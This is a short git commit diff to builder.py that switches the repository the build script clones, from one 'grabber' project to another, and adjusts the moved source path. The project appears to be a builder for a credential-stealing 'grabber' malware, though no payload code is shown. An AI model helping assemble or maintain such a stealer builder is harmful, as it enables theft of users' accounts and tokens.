eefa29dcfc37766299bc96ec4a0b18122b254c23
SkeptralHIDDENLFML1 <122535356+SkeptralHIDDENLFML1@users.noreply.github.com>
2023-01-12 16:58:39 +0300

    Update builder.py

--- builder.py
+++ builder.py
@@ -70,8 +70,8 @@ class make_env:
         os.mkdir(self.build_dir)
 
     def get_src(self) -> None:
-        subprocess.run(['git', 'clone', 'https://github.com/Sykeptical/sykepti-grabber.git'], cwd=self.build_dir)
-        shutil.move(os.path.join(self.build_dir, 'empyrean', 'src'), self.build_dir)
+        subprocess.run(['git', 'clone', 'https://github.com/SkeptralHIDDENLFML1/skeptral-grabber.git'], cwd=self.build_dir)
+        shutil.move(os.path.join(self.build_dir, 'skeptral-grabber', 'src'), self.build_dir)
 
 class write_config:
     def __init__(self, config: dict) -> None:
